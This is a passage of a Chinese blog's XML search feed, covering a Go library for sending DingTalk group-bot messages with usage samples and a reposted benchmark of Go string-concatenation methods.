title="CSS代码兼容补全"></a>CSS代码兼容补全</h4><p><a href="http://autoprefixer.github.io/">http://autoprefixer.github.io/</a></p>]]></content>
      
      
      <categories>
          
          <category> 效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>三行代码发钉钉机器人消息</title>
      <link href="/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-Golang-%E4%B8%89%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%8F%91%E9%80%81%E9%92%89%E9%92%89%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%B6%88%E6%81%AF/"/>
      <url>/%E6%95%88%E7%8E%87%E5%B7%A5%E5%85%B7/2021-03-07-Golang-%E4%B8%89%E8%A1%8C%E4%BB%A3%E7%A0%81%E5%8F%91%E9%80%81%E9%92%89%E9%92%89%E6%9C%BA%E5%99%A8%E4%BA%BA%E6%B6%88%E6%81%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="dingtalk"><a href="#dingtalk" class="headerlink" title="dingtalk"></a>dingtalk</h2><p>钉钉机器人消息封装——Golang</p><p>github：<a href="https://github.com/blinkbean/dingtalk">https://github.com/blinkbean/dingtalk</a></p><p>目前自定义机器人支持</p><ul><li>文本（text）</li><li>链接（link）</li><li>markdown</li><li>ActionCard<ul><li>整体跳转</li><li>独立跳转</li></ul></li><li>FeedCard</li></ul><p><a href="https://ding-doc.dingtalk.com/doc#/serverapi2/qf2nxq">机器人官方文档</a></p><ul><li>添加钉钉群：<strong>35451012</strong>，执行dingtalk_test.go测试方法可直接查看以下消息内容。</li></ul><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><h3 id="创建钉钉群机器人"><a href="#创建钉钉群机器人" class="headerlink" title="创建钉钉群机器人"></a>创建钉钉群机器人</h3><ol><li>选择添加<code>自定义</code>机器人。</li><li>安全设置<br> 共有关键词、加签、IP白名单三种设置，需要根据情况进行选择。<br> <img src="https://i.loli.net/2020/07/05/4XqHG2dOwo8StEu.jpg" alt="Xnip2020-07-05_15-55-24.jpg"></li><li>选择<code>自定义关键词</code>，这里设置的关键词在初始化机器人的时候会用到。</li></ol><h3 id="获取"><a href="#获取" class="headerlink" title="获取"></a>获取</h3>   <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">go</span> get github<span class="token punctuation">.</span>com<span class="token operator">/</span>blinkbean<span class="token operator">/</span>dingtalk<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3>   <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// key 创建钉钉机器人需要设置的关键词，默认为`.`</span><span class="token keyword">func</span> <span class="token function">InitDingTalk</span><span class="token punctuation">(</span>tokens <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">,</span> key <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span>dingTalk<span class="token comment">// 加签方式创建钉钉机器人</span><span class="token comment">// 加签机器人 access_token和secret一一对应，在创建机器人是获取</span><span class="token keyword">func</span> <span class="token function">InitDingTalkWithSecret</span><span class="token punctuation">(</span>tokens <span class="token builtin">string</span><span class="token punctuation">,</span> secret <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token operator">*</span>DingTalk<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>   <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">import</span> <span class="token string">"github.com/blinkbean/dingtalk"</span><span class="token keyword">func</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 单个机器人有单位时间内消息条数的限制，如果有需要可以初始化多个token，发消息时随机发给其中一个机器人。</span>    <span class="token keyword">var</span> dingToken <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"7bd675b66646ba890046c2198257576470099e1bda0770bad7dd6684fb1e0415"</span><span class="token punctuation">&#125;</span>    cli <span class="token operator">:=</span> dingtalk<span class="token punctuation">.</span><span class="token function">InitDingTalk</span><span class="token punctuation">(</span>dingToken<span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span>    cli<span class="token punctuation">.</span><span class="token function">SendTextMessage</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="text类型"><a href="#text类型" class="headerlink" title="text类型"></a>text类型</h3><ul><li>方法及可选参数  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 方法定义</span><span class="token function">SendTextMessage</span><span class="token punctuation">(</span>content <span class="token builtin">string</span><span class="token punctuation">,</span> opt <span class="token operator">...</span>atOption<span class="token punctuation">)</span> <span class="token builtin">error</span><span class="token comment">// 可选参数</span><span class="token comment">// @所有人</span><span class="token function">WithAtAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// @指定群成员</span><span class="token function">WithAtMobiles</span><span class="token punctuation">(</span>mobiles <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>使用  <pre class="line-numbers language-go" data-language="go"><code class="language-go">  <span class="token comment">// at所有人</span>cli<span class="token punctuation">.</span><span class="token function">SendTextMessage</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">,</span> <span class="token function">WithAtAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// at指定群成员</span>mobiles <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"131********"</span><span class="token punctuation">&#125;</span>cli<span class="token punctuation">.</span><span class="token function">SendTextMessage</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">,</span> <span class="token function">WithAtMobiles</span><span class="token punctuation">(</span>mobiles<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <img src="https://i.loli.net/2020/07/05/LXErbH1KiRGstQ7.jpg" alt="Xnip2020-07-05_10-46-59.jpg"></li></ul><h3 id="link类型"><a href="#link类型" class="headerlink" title="link类型"></a>link类型</h3><ul><li>方法  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 方法定义</span><span class="token function">SendLinkMessage</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> text<span class="token punctuation">,</span> picUrl<span class="token punctuation">,</span> msgUrl <span class="token builtin">string</span><span class="token punctuation">)</span> <span class="token builtin">error</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>使用  <pre class="line-numbers language-go" data-language="go"><code class="language-go">cli<span class="token punctuation">.</span><span class="token function">SendLinkMessage</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> text<span class="token punctuation">,</span> picUrl<span class="token punctuation">,</span> msgUrl<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <img src="https://i.loli.net/2020/07/05/wDG1sMPlU7XZQfr.jpg" alt="Xnip2020-07-05_10-25-33.jpg"></li></ul><h3 id="markdown类型"><a href="#markdown类型" class="headerlink" title="markdown类型"></a>markdown类型</h3><ul><li><p>方法及可选参数</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 方法定义</span><span class="token comment">// text：markdown格式字符串</span><span class="token function">SendMarkDownMessage</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> text <span class="token builtin">string</span><span class="token punctuation">,</span> opts <span class="token operator">...</span>atOption<span class="token punctuation">)</span> <span class="token builtin">error</span><span class="token comment">// 可选参数 目前钉钉markdown格式消息不支持@（可能是钉钉的bug），所以以下可选参数暂时不生效。</span><span class="token comment">// @所有人</span><span class="token function">WithAtAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// @指定群成员</span><span class="token function">WithAtMobiles</span><span class="token punctuation">(</span>mobiles <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>使用</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go">cli<span class="token punctuation">.</span><span class="token function">SendMarkDownMessage</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>Markdown进阶</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 按行写入数组，增强markdown的可读性</span>msg <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span>  <span class="token string">"### Link test"</span><span class="token punctuation">,</span>  <span class="token string">"---"</span><span class="token punctuation">,</span>  <span class="token string">"- &lt;font color=#00ff00 size=6>红色文字&lt;/font>"</span><span class="token punctuation">,</span>  <span class="token string">"- content2"</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>cli<span class="token punctuation">.</span><span class="token function">SendMarkDownMessageBySlice</span><span class="token punctuation">(</span><span class="token string">"Markdown title"</span><span class="token punctuation">,</span> msg<span class="token punctuation">,</span> <span class="token function">WithAtAll</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">// 字体及颜色</span>dm <span class="token operator">:=</span> <span class="token function">DingMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span>dm<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"颜色测试"</span><span class="token punctuation">,</span> H2<span class="token punctuation">)</span>dm<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"失败：$$ 同行不同色 $$"</span><span class="token punctuation">,</span> RED<span class="token punctuation">)</span>  <span class="token comment">// 双$分隔</span>dm<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"---"</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>dm<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"金色"</span><span class="token punctuation">,</span> GOLD<span class="token punctuation">)</span>dm<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"成功"</span><span class="token punctuation">,</span> GREEN<span class="token punctuation">)</span>dm<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"警告"</span><span class="token punctuation">,</span> BLUE<span class="token punctuation">)</span>dm<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"普通文字"</span><span class="token punctuation">,</span> N<span class="token punctuation">)</span>cli<span class="token punctuation">.</span><span class="token function">SendMarkDownMessageBySlice</span><span class="token punctuation">(</span><span class="token string">"color test"</span><span class="token punctuation">,</span> dm<span class="token punctuation">.</span><span class="token function">Slice</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>  <img src="https://i.loli.net/2020/07/05/7LScefCZIGnDjBV.jpg" alt="Xnip2020-07-05_10-27-33.jpg"><br>  <img src="https://i.loli.net/2020/07/26/PADJ5uqmfQht2cr.jpg" alt="Xnip2020-07-26_17-14-40.jpg"></p></li><li><p>点击DTMD链接发送消息<br>  点击’dtmdLink1’，自动发送’dtmdValue1’并@机器人，简化输入</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 创建有序map</span>dtmdOrderMap <span class="token operator">:=</span> <span class="token function">DingMap</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"dtmdOrderMap1"</span><span class="token punctuation">,</span> <span class="token string">"dtmdValue1"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"dtmdOrderMap2"</span><span class="token punctuation">,</span> <span class="token string">"dtmdValue2"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"dtmdOrderMap3"</span><span class="token punctuation">,</span> <span class="token string">"dtmdValue3"</span><span class="token punctuation">)</span>err <span class="token operator">:=</span> dingTalkCli<span class="token punctuation">.</span><span class="token function">SendDTMDMessage</span><span class="token punctuation">(</span><span class="token string">"DTMD title"</span><span class="token punctuation">,</span> dtmdOrderMap<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>  <img src="https://i.loli.net/2020/11/02/1OqEr4HKZWapRgd.jpg" alt="Xnip2020-11-02_17-17-26.jpg"></p></li></ul><h3 id="ActionCard类型-独立跳转"><a href="#ActionCard类型-独立跳转" class="headerlink" title="ActionCard类型(独立跳转)"></a>ActionCard类型(独立跳转)</h3><ul><li>方法及可选参数  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 方法定义</span><span class="token function">SendActionCardMessage</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> text <span class="token builtin">string</span><span class="token punctuation">,</span> opts <span class="token operator">...</span>actionCardOption<span class="token punctuation">)</span> <span class="token builtin">error</span><span class="token comment">// 可选参数</span><span class="token comment">// 标题</span><span class="token function">WithCardSingleTitle</span><span class="token punctuation">(</span>title <span class="token builtin">string</span><span class="token punctuation">)</span><span class="token comment">// 跳转地址</span><span class="token function">WithCardSingleURL</span><span class="token punctuation">(</span>url <span class="token builtin">string</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>使用  <pre class="line-numbers language-go" data-language="go"><code class="language-go">cli<span class="token punctuation">.</span><span class="token function">SendActionSingleMessage</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> text<span class="token punctuation">,</span> <span class="token function">WithCardSingleTitle</span><span class="token punctuation">(</span>sTitle<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token function">WithCardSingleURL</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>  <img src="https://i.loli.net/2020/07/05/kKELHAlomndiO9I.jpg" alt="Xnip2020-07-05_10-28-57.jpg"></li></ul><h3 id="ActionCard类型-独立跳转-1"><a href="#ActionCard类型-独立跳转-1" class="headerlink" title="ActionCard类型(独立跳转)"></a>ActionCard类型(独立跳转)</h3><ul><li>方法及可选参数  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 方法定义</span><span class="token function">SendActionCardMessage</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> text <span class="token builtin">string</span><span class="token punctuation">,</span> opts <span class="token operator">...</span>actionCardOption<span class="token punctuation">)</span> <span class="token builtin">error</span><span class="token comment">// 可选参数</span><span class="token comment">// 按钮排列方向，默认水平</span><span class="token function">WithCardBtnVertical</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">// 跳转按钮</span><span class="token function">WithCardBtns</span><span class="token punctuation">(</span>btns <span class="token punctuation">[</span><span class="token punctuation">]</span>ActionCardMultiBtnModel<span class="token punctuation">)</span><span class="token comment">// ActionCardMultiBtnModel</span><span class="token keyword">type</span> ActionCardMultiBtnModel <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  Title     <span class="token builtin">string</span> <span class="token string">`json:"title,omitempty"`</span>  ActionURL <span class="token builtin">string</span> <span class="token string">`json:"actionURL,omitempty"`</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>使用  <pre class="line-numbers language-go" data-language="go"><code class="language-go">btns <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>ActionCardMultiBtnModel<span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span>  Title<span class="token punctuation">:</span>     <span class="token string">"test1"</span><span class="token punctuation">,</span>  ActionURL<span class="token punctuation">:</span> testUrl<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#123;</span>  Title<span class="token punctuation">:</span>     <span class="token string">"test2"</span><span class="token punctuation">,</span>  ActionURL<span class="token punctuation">:</span> testUrl<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>cli<span class="token punctuation">.</span><span class="token function">SendActionSingleMessage</span><span class="token punctuation">(</span>title<span class="token punctuation">,</span> text<span class="token punctuation">,</span> <span class="token function">WithCardBtns</span><span class="token punctuation">(</span>btns<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <img src="https://i.loli.net/2020/07/05/t9GywHFSQUWCVDT.jpg" alt="Xnip2020-07-05_10-29-21.jpg"><br>  <img src="https://i.loli.net/2020/07/26/pEg7hotXZnsaJPV.jpg" alt="Xnip2020-07-26_17-14-56.jpg"></li></ul><h3 id="FeedCard类型"><a href="#FeedCard类型" class="headerlink" title="FeedCard类型"></a>FeedCard类型</h3><ul><li>方法  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token comment">// 方法定义</span><span class="token function">SendFeedCardMessage</span><span class="token punctuation">(</span>feedCard <span class="token punctuation">[</span><span class="token punctuation">]</span>FeedCardLinkModel<span class="token punctuation">)</span> <span class="token builtin">error</span><span class="token comment">// FeedCardLinkModel</span><span class="token keyword">type</span> FeedCardLinkModel <span class="token keyword">struct</span> <span class="token punctuation">&#123;</span>  Title      <span class="token builtin">string</span> <span class="token string">`json:"title,omitempty"`</span>  MessageURL <span class="token builtin">string</span> <span class="token string">`json:"messageURL,omitempty"`</span>  PicURL     <span class="token builtin">string</span> <span class="token string">`json:"picURL,omitempty"`</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>使用  <pre class="line-numbers language-go" data-language="go"><code class="language-go">links <span class="token operator">:=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>FeedCardLinkModel<span class="token punctuation">&#123;</span>  <span class="token punctuation">&#123;</span>      Title<span class="token punctuation">:</span>      <span class="token string">"FeedCard1."</span><span class="token punctuation">,</span>      MessageURL<span class="token punctuation">:</span> testUrl<span class="token punctuation">,</span>      PicURL<span class="token punctuation">:</span>     testImg<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span>      Title<span class="token punctuation">:</span>      <span class="token string">"FeedCard2"</span><span class="token punctuation">,</span>      MessageURL<span class="token punctuation">:</span> testUrl<span class="token punctuation">,</span>      PicURL<span class="token punctuation">:</span>     testImg<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>  <span class="token punctuation">&#123;</span>      Title<span class="token punctuation">:</span>      <span class="token string">"FeedCard3"</span><span class="token punctuation">,</span>      MessageURL<span class="token punctuation">:</span> testUrl<span class="token punctuation">,</span>      PicURL<span class="token punctuation">:</span>     testImg<span class="token punctuation">,</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>cli<span class="token punctuation">.</span><span class="token function">SendFeedCardMessage</span><span class="token punctuation">(</span>links<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>  <img src="https://i.loli.net/2020/07/05/F5WDLqyJ4Yzfj6A.jpg" alt="Xnip2020-07-05_10-30-02.jpg"></li></ul><h3 id="OutGoing"><a href="#OutGoing" class="headerlink" title="OutGoing"></a>OutGoing</h3><ul><li><p>消息格式</p>  <pre class="line-numbers language-json" data-language="json"><code class="language-json"><span class="token punctuation">&#123;</span>  <span class="token property">"atUsers"</span><span class="token operator">:</span><span class="token punctuation">[</span>      <span class="token punctuation">&#123;</span>          <span class="token property">"dingtalkId"</span><span class="token operator">:</span><span class="token string">"$:LWCP_v1:$1h0bmSzcLCHncx0lCt3Bb/UVz7xv/8vh*"</span>      <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span class="token punctuation">,</span>  <span class="token property">"chatbotUserId"</span><span class="token operator">:</span><span class="token string">"$:LWCP_v1:$1h0bmSzcLCHncx0lCt3Bb/UVz7x/8vh*"</span><span class="token punctuation">,</span>  <span class="token property">"conversationId"</span><span class="token operator">:</span><span class="token string">"cidkkCwvtlh1L0RmFuhmashi*=="</span><span class="token punctuation">,</span>  <span class="token property">"conversationTitle"</span><span class="token operator">:</span><span class="token string">"项目群"</span><span class="token punctuation">,</span>  <span class="token property">"conversationType"</span><span class="token operator">:</span><span class="token string">"2"</span><span class="token punctuation">,</span>  <span class="token property">"createAt"</span><span class="token operator">:</span><span class="token number">1595232438950</span><span class="token punctuation">,</span>  <span class="token property">"isAdmin"</span><span class="token operator">:</span><span class="token boolean">false</span><span class="token punctuation">,</span>  <span class="token property">"isInAtList"</span><span class="token operator">:</span><span class="token boolean">true</span><span class="token punctuation">,</span>  <span class="token property">"msgId"</span><span class="token operator">:</span><span class="token string">"msgm/bJkKjTupFM7ZoRF/eKR*=="</span><span class="token punctuation">,</span>  <span class="token property">"msgtype"</span><span class="token operator">:</span><span class="token string">"text"</span><span class="token punctuation">,</span>  <span class="token property">"sceneGroupCode"</span><span class="token operator">:</span><span class="token string">"project"</span><span class="token punctuation">,</span>  <span class="token property">"senderId"</span><span class="token operator">:</span><span class="token string">"$:LWCP_v1:$x4wFOct/DGctv96o4IxxB*=="</span><span class="token punctuation">,</span>  <span class="token property">"senderNick"</span><span class="token operator">:</span><span class="token string">"blinkbean"</span><span class="token punctuation">,</span>  <span class="token property">"sessionWebhook"</span><span class="token operator">:</span><span class="token string">"https://oapi.dingtalk.com/robot/sendBySession?session=6d69b333f243db32d42c11sda9de620*"</span><span class="token punctuation">,</span>  <span class="token property">"sessionWebhookExpiredTime"</span><span class="token operator">:</span><span class="token number">1595237839030</span><span class="token punctuation">,</span>  <span class="token property">"text"</span><span class="token operator">:</span><span class="token punctuation">&#123;</span>      <span class="token property">"content"</span><span class="token operator">:</span><span class="token string">" outgoing"</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>Usage</p>  <pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token function">OutGoing</span><span class="token punctuation">(</span>ctx <span class="token operator">*</span>gin<span class="token punctuation">.</span>Context<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  cli <span class="token operator">:=</span> dingtalk<span class="token punctuation">.</span><span class="token function">InitDingTalk</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token builtin">string</span><span class="token punctuation">&#123;</span><span class="token string">"***"</span><span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token string">"."</span><span class="token punctuation">)</span>  msg<span class="token punctuation">,</span> <span class="token boolean">_</span> <span class="token operator">:=</span> cli<span class="token punctuation">.</span><span class="token function">OutGoing</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>Request<span class="token punctuation">.</span>Body<span class="token punctuation">)</span>  <span class="token comment">// 处理content</span>  res <span class="token operator">:=</span> <span class="token function">doSomeThing</span><span class="token punctuation">(</span>msg<span class="token punctuation">.</span>Text<span class="token punctuation">.</span>Content<span class="token punctuation">)</span>  textMsg <span class="token operator">:=</span> dingtalk<span class="token punctuation">.</span><span class="token function">NewTextMsg</span><span class="token punctuation">(</span>res<span class="token punctuation">)</span>  ctx<span class="token punctuation">.</span><span class="token function">Set</span><span class="token punctuation">(</span><span class="token string">"respData"</span><span class="token punctuation">,</span> textMsg<span class="token punctuation">)</span>  ctx<span class="token punctuation">.</span><span class="token function">JSON</span><span class="token punctuation">(</span>ctx<span class="token punctuation">.</span>Writer<span class="token punctuation">.</span><span class="token function">Status</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>  <span class="token keyword">return</span> <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 效率工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Golang </tag>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Golang-字符串高效拼接</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%AB%98%E6%95%88%E6%8B%BC%E6%8E%A5/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Golang-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%AB%98%E6%95%88%E6%8B%BC%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="原文链接"><a href="#原文链接" class="headerlink" title="原文链接"></a><a href="https://zhuanlan.zhihu.com/p/48865454">原文链接</a></h2><p>在我们编程的时候，和字符串打交道是必不可少的，我们对数据库里文本的处理，Web文本的显示，文本数据的存储等都需要和字符串打交道，那么对于字符串来说，查找、拼接这些都是常用的操作，尤其是以拼接使用的比较多，比如把一个人的姓名和年龄拼接在一起显示。</p><p>在Go语言（golang）中，对于字符串的拼接处理有很多种方法，那么那种方法才是效率最高的呢？因为内存很贵、性能很重要，有时候不慎字符串的转换和拷贝，就可以把你的内存吃光，性能低下，不得不考虑。</p><p>一个例子<br>对于任何功能、性能、方法的研究，没有比例子更有说服力的啦。在这里，我们使用一个例子，来演示不同字符串的拼接方式，以及对应的性能分析。这个例子如下：</p><p>昵称:飞雪无情<br>博客:<a href="http://www.flysnow.org/">http://www.flysnow.org/</a><br>微信公众号:flysnow_org<br>在这个例子中，通过字符串拼接的方式，拼接出如上的内容，这里特别强调，在这个例子中，换行也是字符串拼接的一部分，因为我们要严格拼接出如上的内容。</p><p>+号拼接<br>这种拼接最简单，也最容易被我们使用，因为它是不限编程语言的，比如Go语言有，Java也有，它们是+号运算符，在运行时计算的。现在演示下这种拼接的代码，虽然比较简单。</p><pre class="line-numbers language-none"><code class="language-none">func StringPlus() string&#123;    var s string    s+&#x3D;&quot;昵称&quot;+&quot;:&quot;+&quot;飞雪无情&quot;+&quot;\n&quot;    s+&#x3D;&quot;博客&quot;+&quot;:&quot;+&quot;http:&#x2F;&#x2F;www.flysnow.org&#x2F;&quot;+&quot;\n&quot;    s+&#x3D;&quot;微信公众号&quot;+&quot;:&quot;+&quot;flysnow_org&quot;    return s&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>我们可以自己写个用例测试下，可以打印出和我们例子中一样的内容。那么这种最常见的字符串拼接的方式性能怎么样的呢，我们测试下：</p><pre class="line-numbers language-none"><code class="language-none">func BenchmarkStringPlus(b *testing.B) &#123;    for i:&#x3D;0;i&lt;b.N;i++&#123;        StringPlus()    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行go test -bench&#x3D;. -benchmem 查看性能输出如下：</p><p>BenchmarkStringPlus-8   20000000    108 ns&#x2F;op   144 B&#x2F;op    2 allocs&#x2F;op<br>每次操作需要108ns,进行2次内存分配，分配114字节的内存。</p><p>fmt 拼接<br>这种拼接，借助于fmt.Sprint系列函数进行拼接，然后返回拼接的字符串。</p><pre class="line-numbers language-none"><code class="language-none">func StringFmt() string&#123;    return fmt.Sprint(&quot;昵称&quot;,&quot;:&quot;,&quot;飞雪无情&quot;,&quot;\n&quot;,&quot;博客&quot;,&quot;:&quot;,&quot;http:&#x2F;&#x2F;www.flysnow.org&#x2F;&quot;,&quot;\n&quot;,&quot;微信公众号&quot;,&quot;:&quot;,&quot;flysnow_org&quot;)&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>为了演示，代码没有换行，可能在手机上影响阅读体验，见谅。它的性能我们也测试一下看看效果。</p><pre class="line-numbers language-none"><code class="language-none">func BenchmarkStringFmt(b *testing.B) &#123;    for i:&#x3D;0;i&lt;b.N;i++&#123;        StringFmt()    &#125;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行查看测试结果：</p><p>BenchmarkStringFmt-8    5000000     385 ns&#x2F;op   